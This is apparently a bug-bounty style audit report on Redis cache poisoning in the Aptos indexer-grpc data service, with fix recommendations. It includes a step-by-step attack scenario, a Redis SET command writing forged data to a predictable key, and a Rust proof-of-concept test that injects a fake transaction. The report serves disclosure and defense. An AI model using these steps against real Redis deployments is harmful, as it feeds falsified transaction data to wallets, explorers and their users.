# Audit Report

## Title
Redis Cache Poisoning via Predictable Keys and Missing Integrity Validation in Indexer-GRPC Data Service

## Summary
The indexer-grpc data service uses predictable cache keys without any cryptographic integrity protection (HMAC, signatures, or hash verification) on cached transaction data. An attacker with network access to the Redis instance can inject malicious transaction data that will be served to indexer clients, potentially causing wallets, explorers, and DeFi applications to display incorrect blockchain state or make decisions based on falsified transaction history. [1](#0-0) 

## Finding Description

The vulnerability exists in the indexer-grpc caching architecture, which breaks the **State Consistency** invariant by serving unverified transaction data to clients.

**Architecture Flow:**
1. The cache worker receives transactions from the fullnode via gRPC
2. Transactions are compressed and stored in Redis using predictable keys generated by `CacheEntry::build_key()`
3. The data service retrieves cached data and serves it directly to clients without any integrity verification

**Predictable Cache Keys:**
The cache key generation is deterministic and based solely on the transaction version number: [1](#0-0) 

For example, transaction version 12345 with Lz4CompressedProto format generates key `"l4:12345"`, and with Base64UncompressedProto format generates key `"12345"`. These version numbers are sequential and publicly observable on the blockchain.

**Missing Integrity Protection:**
When the data service retrieves cached data, it performs NO integrity checking: [2](#0-1) 

The cached data is simply decompressed and deserialized without verifying:
- That it came from the legitimate cache worker
- That it matches the actual blockchain state
- Any cryptographic signature or HMAC [3](#0-2) 

**Attack Scenario:**
1. Attacker gains network access to Redis (e.g., via exposed port or network compromise)
2. Attacker identifies target transaction versions (e.g., recent high-value transfers)
3. Attacker crafts malicious `Transaction` protobuf objects with falsified data (modified amounts, recipients, timestamps, etc.)
4. Attacker compresses the malicious data (Lz4 or Base64)
5. Attacker writes to predictable Redis keys: `SET l4:12345 <malicious_compressed_data>`
6. Indexer clients requesting version 12345 receive the poisoned transaction data
7. Wallets, explorers, and DeFi protocols display/use the falsified data

**Redis Exposure in Default Configuration:**
The default docker-compose deployment exposes Redis without authentication: [4](#0-3) 

Redis is bound to `0.0.0.0:6379` with no password, making it accessible to any network peer that can reach the host.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos Bug Bounty criteria for "Significant protocol violations."

**Direct Impacts:**
1. **Data Integrity Violation**: Clients receive transaction data that does not match the canonical blockchain state
2. **Wallet/Explorer Manipulation**: Users see fake transaction history, incorrect balances, and falsified events
3. **DeFi Protocol Compromise**: Smart contracts and off-chain services making decisions based on poisoned indexer data could execute incorrect logic
4. **Trust Degradation**: The indexer service becomes an untrusted data source

**Real-World Harm:**
- A DeFi liquidation bot might skip legitimate liquidations or execute false ones based on poisoned price oracle transaction data
- Wallets might display incorrect token balances, causing users to make poor trading decisions
- Governance dashboards might show fake voting results from poisoned governance transaction data
- Fraud detection systems might miss actual malicious transactions or flag legitimate ones

While this does not directly compromise consensus or validator nodes, it breaks the critical invariant that "State transitions must be atomic and verifiable via Merkle proofs." The indexer-grpc system serves unverifiable data, violating the trust model that underpins blockchain transparency.

## Likelihood Explanation

**Attack Requirements:**
1. Network access to the Redis instance (TCP port 6379)
2. Ability to execute Redis SET commands
3. Knowledge of target transaction versions (publicly available)
4. Basic protobuf serialization capability

**Likelihood Assessment: MEDIUM-HIGH**

**Factors Increasing Likelihood:**
- Default deployment exposes Redis without authentication
- Many production deployments may not implement Redis ACLs or network isolation
- The attack is technically simple (basic Redis commands + protobuf)
- Predictable cache keys require no cryptanalysis or brute-forcing
- No monitoring or alerts for cache tampering

**Factors Decreasing Likelihood:**
- Proper production deployments should place Redis on internal networks
- Redis ACLs and authentication can be configured (though not in default setup)
- Network firewalls might restrict Redis access

However, the fundamental issue is that the CODE lacks defense-in-depth. Even with network security, insider threats, Redis vulnerabilities, or misconfigurations could enable exploitation. Defense-in-depth principles require multiple layers of security, not reliance on external network controls alone.

## Recommendation

Implement cryptographic integrity protection for cached transaction data using one of these approaches:

**Option 1: HMAC-based Verification (Recommended)**
```rust
use hmac::{Hmac, Mac};
use sha2::Sha256;

pub struct CacheEntry {
    data: Vec<u8>,
    hmac: Vec<u8>,
}

impl CacheEntry {
    pub fn new_with_hmac(bytes: Vec<u8>, storage_format: StorageFormat, secret_key: &[u8]) -> Self {
        let mut mac = Hmac::<Sha256>::new_from_slice(secret_key).unwrap();
        mac.update(&bytes);
        let hmac = mac.finalize().into_bytes().to_vec();
        
        Self {
            data: bytes,
            hmac,
        }
    }
    
    pub fn verify_and_extract(self, secret_key: &[u8]) -> Result<Vec<u8>, anyhow::Error> {
        let mut mac = Hmac::<Sha256>::new_from_slice(secret_key).unwrap();
        mac.update(&self.data);
        mac.verify_from_slice(&self.hmac)?;
        Ok(self.data)
    }
}
```

**Option 2: Include Transaction Hash Verification**
Store the transaction hash alongside the cached data and verify it matches the expected hash from the blockchain state. This requires querying the blockchain's transaction accumulator for verification.

**Option 3: Sign Cache Entries**
Have the cache worker sign each cache entry with a private key, and have the data service verify signatures. This provides non-repudiation but is more computationally expensive.

**Additional Hardening:**
1. Enforce Redis authentication in configuration validation
2. Add monitoring/alerting for unexpected cache modifications
3. Implement cache entry versioning with timestamps
4. Rate-limit cache writes to detect poisoning attempts
5. Document Redis security requirements in deployment guides

## Proof of Concept

```rust
// File: ecosystem/indexer-grpc/indexer-grpc-data-service/tests/cache_poisoning_test.rs

#[cfg(test)]
mod cache_poisoning_tests {
    use aptos_indexer_grpc_utils::{
        cache_operator::CacheOperator,
        compression_util::{CacheEntry, StorageFormat},
    };
    use aptos_protos::transaction::v1::Transaction;
    use redis::AsyncCommands;
    
    #[tokio::test]
    async fn test_cache_poisoning_attack() {
        // Setup Redis test instance
        let redis_client = redis::Client::open("redis://127.0.0.1:6379/").unwrap();
        let mut conn = redis_client.get_tokio_connection_manager().await.unwrap();
        
        // Craft malicious transaction with fake data
        let malicious_txn = Transaction {
            version: 99999,
            // Falsified transaction data
            sender: "0xmalicious".to_string(),
            // ... other fake fields
            ..Default::default()
        };
        
        // Create cache entry from malicious transaction
        let malicious_cache_entry = CacheEntry::from_transaction(
            malicious_txn.clone(),
            StorageFormat::Lz4CompressedProto
        );
        
        // Predict the cache key (this is the vulnerability)
        let cache_key = CacheEntry::build_key(99999, StorageFormat::Lz4CompressedProto);
        assert_eq!(cache_key, "l4:99999"); // Predictable!
        
        // Attacker writes malicious data to Redis
        let _: () = conn.set(&cache_key, malicious_cache_entry.into_inner())
            .await
            .unwrap();
        
        // Data service retrieves poisoned cache entry
        let mut cache_operator = CacheOperator::new(conn.clone(), StorageFormat::Lz4CompressedProto);
        let transactions = cache_operator.get_transactions(99999, 1).await.unwrap();
        
        // Verify that the malicious transaction is served (vulnerability confirmed)
        assert_eq!(transactions.len(), 1);
        assert_eq!(transactions[0].version, 99999);
        assert_eq!(transactions[0].sender, "0xmalicious");
        
        // This demonstrates that:
        // 1. Cache keys are predictable
        // 2. Attackers can write malicious data
        // 3. Data service serves poisoned data without validation
        // 4. No integrity checking prevents this attack
    }
}
```

**Notes:**
- This PoC requires a running Redis instance on localhost:6379
- The test demonstrates the complete attack flow
- In production, the attacker would target specific high-value transaction versions
- The lack of HMAC verification or signature checking is the root cause
- The data service blindly trusts whatever data is in Redis, violating defense-in-depth principles

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/compression_util.rs (L127-140)
```rust
    pub fn build_key(version: u64, storage_format: StorageFormat) -> String {
        match storage_format {
            StorageFormat::Lz4CompressedProto => {
                format!("l4:{}", version)
            },
            StorageFormat::Base64UncompressedProto => {
                format!("{}", version)
            },
            StorageFormat::JsonBase64UncompressedProto => {
                // This is fatal to see that we are using legacy file format in cache side.
                panic!("JsonBase64UncompressedProto is not supported in cache.")
            },
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/compression_util.rs (L142-157)
```rust
    pub fn into_transaction(self) -> Transaction {
        match self {
            CacheEntry::Lz4CompressionProto(bytes) => {
                let mut decompressor = Decoder::new(&bytes[..]).expect("Lz4 decompression failed.");
                let mut decompressed = Vec::new();
                decompressor
                    .read_to_end(&mut decompressed)
                    .expect("Lz4 decompression failed.");
                Transaction::decode(decompressed.as_slice()).expect("proto deserialization failed.")
            },
            CacheEntry::Base64UncompressedProto(bytes) => {
                let bytes: Vec<u8> = base64::decode(bytes).expect("base64 decoding failed.");
                Transaction::decode(bytes.as_slice()).expect("proto deserialization failed.")
            },
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L721-738)
```rust
    let batch_get_result = cache_operator
        .batch_get_encoded_proto_data(starting_version)
        .await;

    match batch_get_result {
        // Data is not ready yet in the cache.
        Ok(CacheBatchGetStatus::NotReady) => Ok(TransactionsDataStatus::AheadOfCache),
        Ok(CacheBatchGetStatus::Ok(transactions)) => {
            let decoding_start_time = std::time::Instant::now();
            let size_in_bytes = transactions
                .iter()
                .map(|transaction| transaction.len())
                .sum::<usize>();
            let num_of_transactions = transactions.len();
            let duration_in_secs = current_batch_start_time.elapsed().as_secs_f64();

            let transactions =
                deserialize_cached_transactions(transactions, storage_format).await?;
```

**File:** docker/compose/indexer-grpc/docker-compose.yaml (L16-26)
```yaml
  redis:
    image: ${REDIS_IMAGE_REPO:-redis}:7.2
    command: redis-server --appendonly yes
    networks:
      shared:
        ipv4_address:  172.16.1.12
    restart: unless-stopped
    expose:
      - 6379
    ports:
      - 6379:6379
```
